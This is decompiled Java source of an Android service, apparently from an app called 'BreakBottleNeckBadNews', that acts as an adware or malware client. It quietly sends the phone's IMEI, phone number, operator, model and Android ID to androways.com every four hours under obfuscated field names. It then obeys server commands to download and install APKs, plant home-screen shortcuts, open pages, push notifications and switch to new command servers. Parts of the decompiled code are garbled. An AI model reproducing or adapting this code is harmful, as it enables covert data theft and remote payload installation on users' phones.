package com.androways.advsystem;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Proxy;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.Parcelable;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Locale;
import org.apache.http.util.ByteArrayBuffer;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

public class AdvService extends Service {
  private static final String DEFAULT_URL = "http://androways.com/api/adv2.php";
  
  private static final String TAG = "AdvService";
  
  private static final int UPDATE_INTERVAL = 14400000;
  
  private String ii;
  
  private String io;
  
  private String lg;
  
  private String opNm = "00000";
  
  private String pacNme;
  
  private String phMl;
  
  private String phoNum;
  
  private SharedPreferences prefs;
  
  private String primaryServerUrl = "http://androways.com/api/adv2.php";
  
  private int qyNm = 0;
  
  private String serl = "http://androways.com/api/adv2.php";
  
  private String syNm = "defsysname";
  
  private long tmett;
  
  private String vesn = "02";
  
  private void addShortcut(String paramString1, String paramString2, String paramString3) throws IOException {
    Intent intent1 = new Intent("android.intent.action.VIEW", Uri.parse(paramString2));
    intent1.addFlags(268435456);
    Bitmap bitmap = downloadBitmap(paramString3);
    Intent intent2 = new Intent();
    intent2.putExtra("android.intent.extra.shortcut.INTENT", (Parcelable)intent1);
    intent2.putExtra("android.intent.extra.shortcut.NAME", paramString1);
    intent2.putExtra("duplicate", false);
    int i = getResources().getDimensionPixelSize(17104896);
    intent2.putExtra("android.intent.extra.shortcut.ICON", (Parcelable)Bitmap.createScaledBitmap(bitmap, i, i, true));
    intent2.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
    getApplicationContext().sendBroadcast(intent2);
  }
  
  private void addShortcutAPK(String paramString1, String paramString2, String paramString3, String paramString4) throws IOException {
    DownloadFromUrl(paramString2, paramString4, getApplicationContext());
    Intent intent1 = new Intent("android.intent.action.VIEW");
    intent1.setDataAndType(Uri.fromFile(new File("/mnt/sdcard/download/" + paramString4)), "application/vnd.android.package-archive");
    intent1.setFlags(268435456);
    Bitmap bitmap = downloadBitmap(paramString3);
    Intent intent2 = new Intent();
    intent2.putExtra("android.intent.extra.shortcut.INTENT", (Parcelable)intent1);
    intent2.putExtra("android.intent.extra.shortcut.NAME", paramString1);
    intent2.putExtra("duplicate", false);
    int i = getResources().getDimensionPixelSize(17104896);
    intent2.putExtra("android.intent.extra.shortcut.ICON", (Parcelable)Bitmap.createScaledBitmap(bitmap, i, i, true));
    intent2.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
    getApplicationContext().sendBroadcast(intent2);
  }
  
  private Bitmap downloadBitmap(String paramString) throws IOException {
    String str = Proxy.getDefaultHost();
    int i = Proxy.getDefaultPort();
    URL uRL = new URL(paramString);
    if (i > 0) {
      InetSocketAddress inetSocketAddress = new InetSocketAddress(str, i);
      httpURLConnection = (HttpURLConnection)uRL.openConnection(new Proxy(Proxy.Type.HTTP, inetSocketAddress));
      httpURLConnection.setConnectTimeout(10000);
      httpURLConnection.connect();
      InputStream inputStream1 = httpURLConnection.getInputStream();
      Bitmap bitmap1 = BitmapFactory.decodeStream(inputStream1);
      inputStream1.close();
      httpURLConnection.disconnect();
      return bitmap1;
    } 
    HttpURLConnection httpURLConnection = (HttpURLConnection)httpURLConnection.openConnection();
    httpURLConnection.setConnectTimeout(10000);
    httpURLConnection.connect();
    InputStream inputStream = httpURLConnection.getInputStream();
    Bitmap bitmap = BitmapFactory.decodeStream(inputStream);
    inputStream.close();
    httpURLConnection.disconnect();
    return bitmap;
  }
  
  private void fillPostData() {
    TelephonyManager telephonyManager = (TelephonyManager)getSystemService("phone");
    this.ii = telephonyManager.getDeviceId();
    this.opNm = telephonyManager.getNetworkOperator();
    try {
      this.vesn = (getPackageManager().getPackageInfo(getPackageName(), 0)).versionName;
    } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {}
    this.pacNme = getPackageName();
    this.phoNum = telephonyManager.getLine1Number();
    this.phMl = Build.MODEL;
    this.lg = Locale.getDefault().getLanguage();
    this.io = "{\"io\":\"none\"}";
    log(String.valueOf(this.ii) + " " + this.pacNme + " " + this.phoNum + " " + this.phMl + " " + this.lg + " " + this.io);
  }
  
  private void getUpdate() {
    try {
      sendRequest(this.primaryServerUrl);
    } catch (IOException iOException) {
      log("Primary server is unavailable, try secondary");
      try {
        sendRequest(this.serl);
      } catch (IOException iOException1) {
        log("Secondary server is unavailable too, do nothing");
      } catch (JSONException jSONException) {}
    } catch (JSONException jSONException) {
    
    } finally {
      stopSelf();
    } 
  }
  
  private void increaseQueryNum() {
    this.qyNm++;
    this.prefs.edit().putInt("qyNm", this.qyNm).commit();
  }
  
  private void install(String paramString1, String paramString2, int paramInt1, int paramInt2) {
    DownloadFromUrl(paramString1, paramString2, getApplicationContext());
    Intent intent = new Intent("android.intent.action.VIEW");
    intent.setDataAndType(Uri.fromFile(new File("/mnt/sdcard/download/" + paramString2)), "application/vnd.android.package-archive");
    intent.setFlags(268435456);
    getApplicationContext().startActivity(intent);
  }
  
  private void log(String paramString) {}
  
  private void parseIconInstall(JSONObject paramJSONObject) throws JSONException, IOException {
    String str = paramJSONObject.getString("url");
    addShortcutAPK(paramJSONObject.getString("title"), str, paramJSONObject.getString("icon"), paramJSONObject.getString("apkname"));
  }
  
  private void parseIconPage(JSONObject paramJSONObject) throws JSONException, IOException {
    String str = paramJSONObject.getString("url");
    addShortcut(paramJSONObject.getString("title"), str, paramJSONObject.getString("icon"));
  }
  
  private void parseInstall(JSONObject paramJSONObject) throws JSONException {
    int i = paramJSONObject.getInt("sound");
    int j = paramJSONObject.getInt("vibro");
    install(paramJSONObject.getString("url"), paramJSONObject.getString("apkname"), i, j);
  }
  
  private void parseNews(JSONObject paramJSONObject) throws JSONException {
    int i = paramJSONObject.getInt("id");
    int j = paramJSONObject.getInt("tmett");
    int k = paramJSONObject.getInt("sound");
    int m = paramJSONObject.getInt("vibro");
    String str1 = paramJSONObject.getString("url");
    String str2 = paramJSONObject.getString("text");
    String str3 = paramJSONObject.getString("title");
    showNews(i, paramJSONObject.getString("icon"), str3, str2, str1, j, k, m, 0, "not");
  }
  
  private void parseShowInstall(JSONObject paramJSONObject) throws JSONException {
    int i = paramJSONObject.getInt("id");
    int j = paramJSONObject.getInt("tmett");
    int k = paramJSONObject.getInt("sound");
    int m = paramJSONObject.getInt("vibro");
    String str1 = paramJSONObject.getString("url");
    String str2 = paramJSONObject.getString("text");
    String str3 = paramJSONObject.getString("title");
    showNews(i, paramJSONObject.getString("icon"), str3, str2, str1, j, k, m, 1, paramJSONObject.getString("apkname"));
  }
  
  private void parseShowPage(JSONObject paramJSONObject) throws JSONException {
    int i = paramJSONObject.getInt("sound");
    int j = paramJSONObject.getInt("vibro");
    showPage(paramJSONObject.getString("url"), i, j);
  }
  
  private void sendRequest(String paramString) throws IOException, JSONException {
    HttpURLConnection httpURLConnection;
    String str = Proxy.getDefaultHost();
    int i = Proxy.getDefaultPort();
    URL uRL = new URL(paramString);
    if (i > 0) {
      InetSocketAddress inetSocketAddress = new InetSocketAddress(str, i);
      httpURLConnection = (HttpURLConnection)uRL.openConnection(new Proxy(Proxy.Type.HTTP, inetSocketAddress));
    } else {
      httpURLConnection = (HttpURLConnection)httpURLConnection.openConnection();
    } 
    httpURLConnection.setDoInput(true);
    httpURLConnection.setDoOutput(true);
    httpURLConnection.setRequestMethod("POST");
    httpURLConnection.setConnectTimeout(10000);
    this.tmett = System.currentTimeMillis() / 1000L;
    DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
    dataOutputStream.writeBytes("ozro=" + this.ii + "&qsvlshr=" + this.pacNme + "&qjpmr=" + this.phoNum + "&brdm=" + this.vesn + "&dudmszr=" + this.syNm + "&pqrtsypt=" + this.opNm + "&dfl=" + Build.VERSION.SDK + "&yzryy=" + this.tmett + "&zpfrs=" + this.phMl + "&lg=" + this.lg + "&io=" + this.io + "&qyNm=" + this.qyNm + "&devicesid=" + Settings.Secure.getString(getBaseContext().getContentResolver(), "android_id"));
    dataOutputStream.flush();
    dataOutputStream.close();
    httpURLConnection.connect();
    InputStream inputStream = httpURLConnection.getInputStream();
    if (inputStream != null) {
      increaseQueryNum();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
      StringBuilder stringBuilder = new StringBuilder();
      while (true) {
        String str1;
        JSONObject jSONObject;
        String str2 = bufferedReader.readLine();
        if (str2 == null) {
          jSONObject = new JSONObject(new JSONTokener(stringBuilder.toString()));
          str1 = jSONObject.getString("status");
          if (str1.equalsIgnoreCase("news"))
            parseNews(jSONObject); 
          if (str1.equalsIgnoreCase("showpage"))
            parseShowPage(jSONObject); 
          if (str1.equalsIgnoreCase("install"))
            parseInstall(jSONObject); 
          if (str1.equalsIgnoreCase("showinstall"))
            parseShowInstall(jSONObject); 
          if (str1.equalsIgnoreCase("iconpage"))
            parseIconPage(jSONObject); 
          if (str1.equalsIgnoreCase("iconinstall"))
            parseIconInstall(jSONObject); 
          if (str1.equalsIgnoreCase("newdomen")) {
            this.primaryServerUrl = jSONObject.getString("url");
            this.prefs.edit().putString("primaryServerUrl", this.primaryServerUrl).commit();
          } 
          if (str1.equalsIgnoreCase("seconddomen")) {
            this.serl = jSONObject.getString("url");
            this.prefs.edit().putString("serl", this.serl).commit();
          } 
          if (str1.equalsIgnoreCase("stop")) {
            stopUpdating();
            stopSelf();
          } 
          if (str1.equalsIgnoreCase("testpost"))
            sendRequest(paramString); 
          str1.equalsIgnoreCase("ok");
        } else {
          str1.append((String)jSONObject).append("\n");
          continue;
        } 
        inputStream.close();
        httpURLConnection.disconnect();
        return;
      } 
    } 
    inputStream.close();
    httpURLConnection.disconnect();
  }
  
  private void showNews(int paramInt1, String paramString1, String paramString2, String paramString3, String paramString4, int paramInt2, int paramInt3, int paramInt4, int paramInt5, String paramString5) {
    log("show news " + paramInt1 + " " + paramString2 + " " + paramString3 + " " + paramString4 + " " + paramInt2);
    NotificationManager notificationManager = (NotificationManager)getSystemService("notification");
    Notification notification = new Notification(getResources().getIdentifier(paramString1, null, null), paramString2, System.currentTimeMillis());
    Intent intent = new Intent(getApplicationContext(), AdvService.class);
    intent.putExtra("extendedTitle", paramString2);
    intent.putExtra("extendedText", paramString3);
    if (paramInt5 == 0) {
      intent = new Intent("android.intent.action.VIEW", Uri.parse(paramString4));
    } else {
      DownloadFromUrl(paramString4, paramString5, getApplicationContext());
      intent = new Intent("android.intent.action.VIEW");
      intent.setDataAndType(Uri.fromFile(new File("/mnt/sdcard/download/" + paramString5)), "application/vnd.android.package-archive");
      intent.setFlags(268435456);
    } 
    PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);
    notification.setLatestEventInfo(getApplicationContext(), paramString2, paramString3, pendingIntent);
    notification.flags |= 0x10;
    notification.flags |= 0x2;
    if (paramInt4 == 1)
      notification.defaults |= 0x2; 
    if (paramInt3 == 1)
      notification.defaults |= 0x1; 
    notification.ledOnMS = 200;
    notification.ledOffMS = 200;
    notification.ledARGB = 9699539;
    notificationManager.notify(paramInt1, notification);
  }
  
  private void showPage(String paramString, int paramInt1, int paramInt2) {
    Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
    intent.addFlags(268435456);
    getApplicationContext().startActivity(intent);
  }
  
  private void startUpdateThread() {
    (new Thread(new Runnable() {
          public void run() {
            AdvService.this.getUpdate();
          }
        })).start();
  }
  
  private void startUpdater() {
    AlarmManager alarmManager = (AlarmManager)getApplicationContext().getSystemService("alarm");
    PendingIntent pendingIntent = PendingIntent.getBroadcast((Context)this, 0, new Intent((Context)this, AReceiver.class), 134217728);
    alarmManager.cancel(pendingIntent);
    alarmManager.setRepeating(3, SystemClock.elapsedRealtime(), 14400000L, pendingIntent);
  }
  
  private void stopUpdating() {
    PendingIntent pendingIntent = PendingIntent.getBroadcast((Context)this, 0, new Intent((Context)this, AReceiver.class), 134217728);
    ((AlarmManager)getApplicationContext().getSystemService("alarm")).cancel(pendingIntent);
  }
  
  public void DownloadFromUrl(String paramString1, String paramString2, Context paramContext) {
    try {
      URL uRL = new URL();
      this(paramString1);
      File file = new File();
      this(paramString2);
      System.currentTimeMillis();
      InputStream inputStream = uRL.openConnection().getInputStream();
      BufferedInputStream bufferedInputStream = new BufferedInputStream();
      this(inputStream);
      ByteArrayBuffer byteArrayBuffer = new ByteArrayBuffer();
      this(50);
      while (true) {
        int i = bufferedInputStream.read();
        if (i == -1) {
          FileOutputStream fileOutputStream = new FileOutputStream();
          StringBuilder stringBuilder = new StringBuilder();
          this("/mnt/sdcard/download/");
          this(stringBuilder.append(file).toString());
          fileOutputStream.write(byteArrayBuffer.toByteArray());
          fileOutputStream.close();
          return;
        } 
        byteArrayBuffer.append((byte)i);
      } 
    } catch (IOException iOException) {}
  }
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public void onCreate() {
    log("AdvService Created");
    try {
      this.syNm = (getPackageManager().getApplicationInfo(getPackageName(), 128)).metaData.getString("androways_key");
    } catch (android.content.pm.PackageManager.NameNotFoundException nameNotFoundException) {
    
    } catch (NullPointerException nullPointerException) {}
    fillPostData();
    this.prefs = getSharedPreferences("AdvService", 0);
    this.primaryServerUrl = this.prefs.getString("primaryServerUrl", "http://androways.com/api/adv2.php");
    this.serl = this.prefs.getString("serl", "http://androways.com/api/adv2.php");
    this.qyNm = this.prefs.getInt("qyNm", 0);
  }
  
  public void onDestroy() {
    log("AdvService Destroyed");
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    log("AdvService Started");
    if (paramIntent != null) {
      if (paramIntent.getExtras() != null) {
        if (paramIntent.getExtras().getBoolean("update"))
          startUpdateThread(); 
        return 1;
      } 
      startUpdater();
      return 1;
    } 
    startUpdater();
    return 1;
  }
}


/* Location:              /home/fahim/Desktop/BreakBottleNeckBadNews-dex2jar.jar!/com/androways/advsystem/AdvService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */